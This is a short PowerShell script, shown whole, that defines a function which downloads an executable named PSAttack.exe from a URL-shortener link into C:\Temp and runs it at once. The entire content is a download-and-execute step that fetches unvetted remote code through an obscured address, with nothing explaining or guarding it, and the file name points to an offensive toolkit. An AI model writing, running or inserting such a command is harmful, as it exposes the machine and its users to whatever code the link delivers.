function Go {
    $WebClient = New-Object System.Net.WebClient
    $WebClient.DownloadFile("https://bit.ly/2TWML79","C:\Temp\PSAttack.exe")
    & 'C:\Temp\PSAttack.exe'
}